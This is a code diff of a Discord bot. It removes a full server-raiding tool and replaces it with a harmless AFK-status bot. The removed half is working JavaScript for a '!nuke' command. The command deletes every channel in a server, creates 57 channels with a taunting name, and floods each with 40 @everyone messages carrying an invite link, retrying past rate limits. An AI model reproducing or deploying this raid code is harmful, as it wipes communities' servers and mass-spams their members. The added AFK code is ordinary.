@@ -1,115 +1,161 @@
-const { Client, GatewayIntentBits, PermissionsBitField, ChannelType, ActivityType } = require('discord.js');
-const fs = require('fs');
-
-// ---- LOAD TOKEN ----
-let TOKEN = process.env.TOKEN;
-let OWNER_ID = process.env.OWNER_ID;
-
-if (!TOKEN || !OWNER_ID) {
-  try {
-    const config = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
-    TOKEN = config.TOKEN;
-    OWNER_ID = config.OWNER_ID;
-    console.log("✅ Loaded from config.json");
-  } catch (e) {
-    console.error("❌ NO TOKEN OR OWNER_ID in env or config.json");
-    process.exit(1);
-  }
-}
-
-console.log(`🔑 Token loaded, length: ${TOKEN.length}`);
-if (TOKEN.length < 50) console.error("⚠️ Token looks too short");
+const {
+  Client,
+  GatewayIntentBits,
+  ActivityType,
+  SlashCommandBuilder,
+  REST,
+  Routes,
+  ContainerBuilder,
+  MessageFlags
+} = require('discord.js');
 
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildMessages,
-    GatewayIntentBits.MessageContent,
-    GatewayIntentBits.GuildMembers
+    GatewayIntentBits.MessageContent
   ]
 });
 
-const prefix = '!';
-const ownerId = OWNER_ID;
-const spamMsg = `@everyone @here Lipad server mga kumag! https://discord.gg/qWD57gU7S __script__ . ~~boost~~ ||@everyone|| ||@here||`;
+const PREFIX = ".";
+const afkUsers = new Map();
 
-function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
+client.once('ready', async () => {
+  console.log(`Logged in as ${client.user.tag}`);
 
-async function deleteAllChannels(guild) {
-  let channels = guild.channels.cache;
-  console.log(`🗑️ Deleting ${channels.size} channels...`);
-  for (let chan of channels.values()) {
-    try { await chan.delete(); await sleep(400); } catch(e) { console.log(`Failed: ${chan.name} – ${e.message}`); }
-  }
-}
-
-async function create57Channels(guild) {
-  let created = [];
-  for (let i = 1; i <= 57; i++) {
-    let name = `lipad-server-mga-kumag-${i}`;
-    try {
-      let channel = await guild.channels.create({
-        name: name,
-        type: ChannelType.GuildText,
-        permissionOverwrites: [{ id: guild.roles.everyone.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }]
-      });
-      created.push(channel);
-      console.log(`📝 Created #${name}`);
-      await sleep(350);
-    } catch(err) {
-      if (err.code === 429) { await sleep(err.retryAfter * 1000); i--; }
-      else console.log(`❌ Create fail ${name}: ${err.message}`);
-    }
-  }
-  return created;
-}
-
-async function floodChannel(channel, count = 40) {
-  for (let i = 0; i < count; i++) {
-    try { await channel.send(spamMsg); await sleep(200); }
-    catch(err) {
-      if (err.code === 429) { await sleep(err.retryAfter * 1000); i--; }
-      else console.log(`❌ Msg fail in #${channel.name}: ${err.message}`);
-    }
-  }
-  console.log(`📢 Sent 40 messages in #${channel.name}`);
-}
-
-async function nukeGuild(guild) {
-  console.log(`🔥 NUKING ${guild.name}`);
-  await deleteAllChannels(guild);
-  let channels = await create57Channels(guild);
-  for (let ch of channels) await floodChannel(ch, 40);
-  console.log("💀 NUKE COMPLETE");
-}
-
-client.once('ready', () => {
-  console.log(`✅ Logged in as ${client.user.tag}`);
-  
-  // Set status: DND + custom text "@azairo"
   client.user.setPresence({
     status: 'dnd',
     activities: [{
-      name: '@azairo',
-      type: ActivityType.Custom,   // Custom status
-      state: '@azairo'             // The text shown
+      name: 'Owned by Nex',
+      type: ActivityType.Custom
     }]
   });
-  console.log("✅ Status set to DND with custom text @azairo");
+
+  // register slash
+  const commands = [
+    new SlashCommandBuilder()
+      .setName('afk')
+      .setDescription('Set AFK')
+      .addStringOption(opt =>
+        opt.setName('reason')
+          .setDescription('Reason')
+          .setRequired(true))
+  ].map(c => c.toJSON());
+
+  const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);
+
+  await rest.put(
+    Routes.applicationCommands(client.user.id),
+    { body: commands }
+  );
 });
 
-client.on('messageCreate', async (msg) => {
-  if (msg.author.bot || !msg.content.startsWith(prefix)) return;
-  const args = msg.content.slice(prefix.length).trim().split(/ +/);
+// function to build container
+function afkContainer(textTop, reason) {
+  return new ContainerBuilder()
+    .setAccentColor(0x2b2d31)
+    .addTextDisplayComponents(t =>
+      t.setContent(textTop)
+    )
+    .addSeparatorComponents(s => s)
+    .addTextDisplayComponents(t =>
+      t.setContent(`**Reason:** ${reason}`)
+    );
+}
+
+// MESSAGE EVENT
+client.on('messageCreate', async (message) => {
+  if (message.author.bot) return;
+
+  // mention check
+  message.mentions.users.forEach(user => {
+    if (afkUsers.has(user.id)) {
+      const data = afkUsers.get(user.id);
+
+      const container = afkContainer(
+        `@${user.username} is now afk`,
+        data.reason
+      );
+
+      message.reply({
+        components: [container],
+        flags: MessageFlags.IsComponentsV2
+      });
+    }
+  });
+
+  // remove AFK
+  if (afkUsers.has(message.author.id)) {
+    afkUsers.delete(message.author.id);
+
+    if (message.member.nickname?.startsWith("[AFK] ")) {
+      await message.member.setNickname(
+        message.member.nickname.replace("[AFK] ", "")
+      ).catch(() => {});
+    }
+
+    const container = new ContainerBuilder()
+      .setAccentColor(0x2b2d31)
+      .addTextDisplayComponents(t =>
+        t.setContent("You are no longer AFK")
+      );
+
+    message.reply({
+      components: [container],
+      flags: MessageFlags.IsComponentsV2
+    });
+  }
+
+  if (!message.content.startsWith(PREFIX)) return;
+
+  const args = message.content.slice(PREFIX.length).trim().split(/ +/);
   const cmd = args.shift().toLowerCase();
-  if (cmd === 'nuke' && msg.author.id === ownerId) {
-    if (args[0] !== 'confirm') return msg.reply("⚠️ Type `!nuke confirm` to proceed.");
-    await msg.reply("💣 Nuking...");
-    await nukeGuild(msg.guild);
+
+  // PREFIX AFK
+  if (cmd === "afk") {
+    const reason = args.join(" ") || "No reason";
+
+    afkUsers.set(message.author.id, { reason });
+
+    try {
+      await message.member.setNickname(`[AFK] ${message.member.displayName}`);
+    } catch {}
+
+    const container = afkContainer(
+      `${message.author} is now afk`,
+      reason
+    );
+
+    message.channel.send({
+      components: [container],
+      flags: MessageFlags.IsComponentsV2
+    });
   }
 });
 
-client.login(TOKEN).catch(err => {
-  console.error("❌ Login failed:", err.message);
-  if (err.message.includes("token")) console.error("➡️ Your token is invalid. Reset it on Discord Developer Portal.");
+// SLASH AFK
+client.on('interactionCreate', async (interaction) => {
+  if (!interaction.isChatInputCommand()) return;
+
+  if (interaction.commandName === 'afk') {
+    const reason = interaction.options.getString('reason');
+
+    afkUsers.set(interaction.user.id, { reason });
+
+    try {
+      await interaction.member.setNickname(`[AFK] ${interaction.member.displayName}`);
+    } catch {}
+
+    const container = afkContainer(
+      `${interaction.user} is now afk`,
+      reason
+    );
+
+    await interaction.reply({
+      components: [container],
+      flags: MessageFlags.IsComponentsV2
+    });
+  }
 });
+
+client.login(process.env.TOKEN);
